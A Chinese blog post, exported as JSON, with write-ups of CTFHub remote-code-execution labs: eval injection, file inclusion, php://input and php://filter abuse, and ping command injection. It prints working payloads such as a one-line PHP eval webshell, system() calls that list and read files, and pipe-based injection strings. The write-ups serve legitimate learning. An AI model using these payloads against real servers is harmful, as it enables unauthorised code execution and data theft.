{"title":"ctfhub之RCE","uid":"47fc5eb1db81ba54d8cb43c79f27163b","slug":"ctfhub之RCE","date":"2022-11-30T15:23:08.850Z","updated":"2022-12-01T08:47:16.625Z","comments":true,"path":"api/articles/ctfhub之RCE.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora05efd2055b9c4c1bb9eb9d85d192c3f5.jpg","content":"<h2 id=\"eval执行\"><a href=\"#eval执行\" class=\"headerlink\" title=\"eval执行\"></a>eval执行</h2><h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目:\"></a>题目:</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201010751716.png\" alt=\"image-20221201010751716\"></p>\n<h3 id=\"所需知识\"><a href=\"#所需知识\" class=\"headerlink\" title=\"所需知识:\"></a>所需知识:</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">eval():把字符串 code 作为PHP代码执行。函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。</code></pre>\n\n<h3 id=\"解题过程\"><a href=\"#解题过程\" class=\"headerlink\" title=\"解题过程:\"></a>解题过程:</h3><p><strong>这题根据源码其实有两种解题思路,下面挨个讲解</strong></p>\n<h4 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h4><p>直接在url地址后面输入<code>?cmd=system(&quot;ls /&quot;);</code>切记输入；</p>\n<p>这里的意思就是查看根目录</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201011339414.png\" alt=\"image-20221201011339414\"></p>\n<p>可以看到个flag_30217这个文件</p>\n<p>再用<code>?cmd=system(&quot;cat /flag_30217&quot;);</code>就能查看文件内容了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201011518390.png\" alt=\"image-20221201011518390\"></p>\n<h4 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h4><p>这种解法更为简单粗暴</p>\n<p>分析源码,这其实就是php的一句话木马,所以这里我们直接用蚁剑连接就好了,密码为cmd</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201011647629.png\" alt=\"image-20221201011647629\"></p>\n<p>剩下的过程就不必我多说了</p>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><h3 id=\"题目：\"><a href=\"#题目：\" class=\"headerlink\" title=\"题目：\"></a>题目：</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201133328178.png\" alt=\"image-20221201133328178\"></p>\n<h3 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if (isset($_GET[&#39;file&#39;])) &#123;\n    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;\n        include $_GET[&quot;file&quot;];</code></pre>\n\n<p>重点是这段代码</p>\n<p>这里有一个strpos(string,find,start)函数</p>\n<p>这里意思在string<a href=\"https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020\">字符串</a>中找find的位置,start是查找的开始位置</p>\n<p>那么这句代码的意思就是如果file中没有flag字符串就执行下面的<code>include $_GET[&quot;file&quot;]</code></p>\n<p>否则就输出Hacker。</p>\n<h4 id=\"strpos-函数\"><a href=\"#strpos-函数\" class=\"headerlink\" title=\"strpos()函数\"></a>strpos()函数</h4><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p>\n<p><strong>语法</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">strpos(string,find,start)</code></pre>\n\n<p><strong>参数</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">string\t必需。规定被搜索的字符串。\n\nfind\t必需。规定要查找的字符。\n\nstart\t可选。规定开始搜索的位置。</code></pre>\n\n<p><strong>返回值</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释： 字符串位置从 0 开始，不是从 1 开始。</code></pre>\n\n\n\n<p>再看一下shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;</code></pre>\n\n<p>是将ctfhub传的参数用php执行</p>\n<p><strong>include()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</strong></p>\n<p>输入一个文件的名字，可以直接将文件include到php文件中,这里显然是让我们把shell引入</p>\n<p>在hackbar中这样输入</p>\n<p><code>ctfhub=system(&#39;ls /&#39;);</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201135201249.png\" alt=\"image-20221201135201249\"></p>\n<p>可以看到flag</p>\n<p>再输入<code>ctfhub=system(&#39;cat /flag&#39;);</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201135242658.png\" alt=\"image-20221201135242658\"></p>\n<p>找到flag</p>\n<h2 id=\"php-x2F-x2F-input\"><a href=\"#php-x2F-x2F-input\" class=\"headerlink\" title=\"php:&#x2F;&#x2F;input\"></a>php:&#x2F;&#x2F;input</h2><h3 id=\"题目-1\"><a href=\"#题目-1\" class=\"headerlink\" title=\"题目:\"></a>题目:</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201135522244.png\" alt=\"image-20221201135522244\"></p>\n<h3 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h3><p>这道题要做的事情就是，找到flag文件存储的存储的位置，然后，读取。这样的话，应该是需要命令执行的漏洞。此时php:&#x2F;&#x2F;input有一个知识点：</p>\n<h4 id=\"php-x2F-x2F-input-1\"><a href=\"#php-x2F-x2F-input-1\" class=\"headerlink\" title=\"php:&#x2F;&#x2F;input\"></a>php:&#x2F;&#x2F;input</h4><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora20210114172646745.png\" alt=\"img\"></p>\n<p>所以我们需要使用<code>php://input</code>来构造发送的指令</p>\n<p>查看phpinfo，找到条件</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201140003882.png\" alt=\"image-20221201140003882\"></p>\n<p>说明可以用php:&#x2F;&#x2F;input</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">使用burp suite抓包\n方法：POST\n目标：&#x2F;?file&#x3D;php:&#x2F;&#x2F;input\nBody：&lt;?php system(&quot;ls &#x2F;&quot;); ?&gt;</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201140140304.png\" alt=\"image-20221201140140304\"></p>\n<p>这里我写错了,应该是<code>php://input</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201140355358.png\" alt=\"image-20221201140355358\"></p>\n<p>接下来就是查看了<code>&lt;?php system(&#39;cat /flag_10874&#39;); ?&gt;</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201140447578.png\" alt=\"image-20221201140447578\"></p>\n<h2 id=\"读取源代码\"><a href=\"#读取源代码\" class=\"headerlink\" title=\"读取源代码\"></a>读取源代码</h2><h3 id=\"题目-2\"><a href=\"#题目-2\" class=\"headerlink\" title=\"题目:\"></a>题目:</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201160520929.png\" alt=\"image-20221201160520929\"></p>\n<h3 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路:\"></a>解题思路:</h3><p>试了试 php:&#x2F;&#x2F;input 发现用不了,应该是条件不允许了</p>\n<p>这里引入另一个php伪协议:<code>php://filter</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">php:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。\n\nPHP.ini：\nphp:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201161205642.png\" alt=\"image-20221201161205642\"></p>\n<p>告诉flag的位置在&#x2F;flag里，接下来就直接用php:&#x2F;&#x2F;filter提取就可以了。</p>\n<p><code>?file=php://filter/resource=/flag</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201161330770.png\" alt=\"image-20221201161330770\"></p>\n<h2 id=\"远程包含\"><a href=\"#远程包含\" class=\"headerlink\" title=\"远程包含\"></a>远程包含</h2><h3 id=\"题目-3\"><a href=\"#题目-3\" class=\"headerlink\" title=\"题目:\"></a>题目:</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201162829518.png\" alt=\"image-20221201162829518\"></p>\n<h3 id=\"解题思路-3\"><a href=\"#解题思路-3\" class=\"headerlink\" title=\"解题思路:\"></a>解题思路:</h3><p>思路和前面几题基本一致</p>\n<p>在PHP的配置文件php.ini里将allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<p>直接用php:&#x2F;&#x2F;input进行命令执行</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201164512990.png\" alt=\"image-20221201164512990\"></p>\n<p>查看flag</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221201164535065.png\" alt=\"image-20221201164535065\"></p>\n<h2 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h2><h3 id=\"题目：-1\"><a href=\"#题目：-1\" class=\"headerlink\" title=\"题目：\"></a>题目：</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130232531069.png\" alt=\"image-20221130232531069\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130232625729.png\" alt=\"image-20221130232625729\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130232633679.png\" alt=\"image-20221130232633679\"></p>\n<h3 id=\"所需知识：\"><a href=\"#所需知识：\" class=\"headerlink\" title=\"所需知识：\"></a>所需知识：</h3><p><strong>如果你是大佬这段可以不看,我写出来主要是自己代码知识薄弱,方便我理解代码的意思</strong></p>\n<h4 id=\"exec（）函数：\"><a href=\"#exec（）函数：\" class=\"headerlink\" title=\"exec（）函数：\"></a>exec（）函数：</h4><p>PHP中提供了几个调用linux命令的函数，exec、system、passthru；</p>\n<p>其中exec()函数用来执行一个外部程序。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">php中的exec()函数的用法：exec()函数用于执行一个外部程序，语法为：【exec(string $command[,array &amp;$output[,int &amp;$return_var ]]);】。</code></pre>\n\n<p><strong>开启exec()函数：</strong></p>\n<p>exec()函数是被禁用的，要使用这个函数必须先开启。首先是 要关掉 安全模式 safe_mode &#x3D; off。然后在看看 禁用函数列表</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">disable_ functions &#x3D; proc_ open,popen,exec,system,shell_ exec,passthru</code></pre>\n\n<p>这里要把 exec 去掉，重启 apache 就OK了。</p>\n<p><strong>exec()函数基本用法：</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec(string $command [,array &amp;$output[, int &amp;$return_var]]);</code></pre>\n\n<p>$command：表示要执行的命令。</p>\n<p>$output: 如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如  \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入  exec() 函数之前 对数组使用 unset() 函数进行重置。</p>\n<p>$return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</p>\n<p>一般来说，我们只要写第一个参数，也就是$command。</p>\n<p>例子:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$command &#x3D; &quot;ls &#x2F;tmp&#x2F;test&quot;; &#x2F;&#x2F;ls是linux下的查目录，文件的命令\nexec($command,$array); &#x2F;&#x2F;执行命令\nprint_r($array);\n?&gt;</code></pre>\n\n<p>返回结果:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@krlcgcms01 shell]# php .&#x2F;exec.php\nArray\n(\n[0] &#x3D;&gt; 1001.log\n[1] &#x3D;&gt; 10.log\n[2] &#x3D;&gt; 10.tar.gz\n[3] &#x3D;&gt; aaa.tar.gz\n[4] &#x3D;&gt; mytest\n[5] &#x3D;&gt; test1101\n[6] &#x3D;&gt; test1102\n[7] &#x3D;&gt; weblog_2010_09\n)</code></pre>\n\n<h4 id=\"PHP-print-r-函数\"><a href=\"#PHP-print-r-函数\" class=\"headerlink\" title=\"PHP print_r() 函数:\"></a>PHP print_r() 函数:</h4><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示。</p>\n<p>语法:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bool print_r ( mixed $expression [, bool $return ] )</code></pre>\n\n<p>参数说明：</p>\n<ul>\n<li>$expression: 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。</li>\n<li>$return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。</li>\n</ul>\n<p>返回值:</p>\n<p>$return 如果设为 <strong>true</strong> 才有返回值，为一个易于理解的字符串信息。</p>\n<h3 id=\"解题过程：\"><a href=\"#解题过程：\" class=\"headerlink\" title=\"解题过程：\"></a>解题过程：</h3><p>直接尝试ping百度</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130232850283.png\" alt=\"image-20221130232850283\"></p>\n<p>构造payload</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1|ls</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130234755902.png\" alt=\"image-20221130234755902\"></p>\n<p>可以看到疑似flag的文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1|cat 278433166717673.php</code></pre>\n\n<p>没有任何结果</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130235017815.png\" alt=\"image-20221130235017815\"></p>\n<p>再次构造:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1|cat 278433166717673.php|base64</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130235035878.png\" alt=\"image-20221130235035878\"></p>\n<p>再把这串代码拿去base64解码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221130235128431.png\" alt=\"image-20221130235128431\"></p>\n<p>得到flag</p>\n<p>也可以直接用cat查看</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1|cat 278433166717673.php</code></pre>\n\n","text":"eval执行题目: 所需知识:eval():把字符串 code 作为PHP代码执行。函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":15,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#eval%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">eval执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE\"><span class=\"toc-text\">题目:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%80%E9%9C%80%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">所需知识:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">解题过程:</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">解法一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">解法二</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE%EF%BC%9A\"><span class=\"toc-text\">题目：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">解题思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#strpos-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">strpos()函数</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-x2F-x2F-input\"><span class=\"toc-text\">php:&#x2F;&#x2F;input</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE-1\"><span class=\"toc-text\">题目:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">解题思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#php-x2F-x2F-input-1\"><span class=\"toc-text\">php:&#x2F;&#x2F;input</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">读取源代码</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE-2\"><span class=\"toc-text\">题目:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">解题思路:</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">远程包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE-3\"><span class=\"toc-text\">题目:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3\"><span class=\"toc-text\">解题思路:</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">命令注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE%EF%BC%9A-1\"><span class=\"toc-text\">题目：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%80%E9%9C%80%E7%9F%A5%E8%AF%86%EF%BC%9A\"><span class=\"toc-text\">所需知识：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#exec%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%EF%BC%9A\"><span class=\"toc-text\">exec（）函数：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#PHP-print-r-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">PHP print_r() 函数:</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A\"><span class=\"toc-text\">解题过程：</span></a></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析命令执行漏洞","uid":"266dd7a9ffe02e836b26a1bdfda91c39","slug":"命令执行漏洞","date":"2022-11-30T15:59:15.004Z","updated":"2022-12-01T09:31:33.088Z","comments":true,"path":"api/articles/命令执行漏洞.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-vgd6lm_1920x1080.png","text":"漏洞描述命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有**system( )、exec( )、shell_exec( )、passthru( )...","link":"","photos":[],"count_time":{"symbolsCount":"8k","symbolsTime":"7 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":15,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞","slug":"漏洞","count":3,"path":"api/tags/漏洞.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"漏洞扫描工具安装及配置","uid":"3969cae396587846c4e6dba7e64fd9e1","slug":"漏洞扫描工具安装","date":"2022-11-25T04:30:44.427Z","updated":"2022-11-25T07:52:03.974Z","comments":true,"path":"api/articles/漏洞扫描工具安装.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-5gdp69_3840x2160.png","text":" 工具下载地址 链接：https://pan.baidu.com/s/1Ysn-u1ae6Z-p4PD2lDTKrg?pwd=x3ji提取码：x3ji AWVS先将压缩包解压 点击进行安装 一直下一步就行了，让你输邮箱就随便输一个，但是要记住 记住端口号 安装 安装途中会弹窗，询...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"环境配置","slug":"环境配置","count":4,"path":"api/categories/环境配置.json"}],"tags":[{"name":"工具","slug":"工具","count":3,"path":"api/tags/工具.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}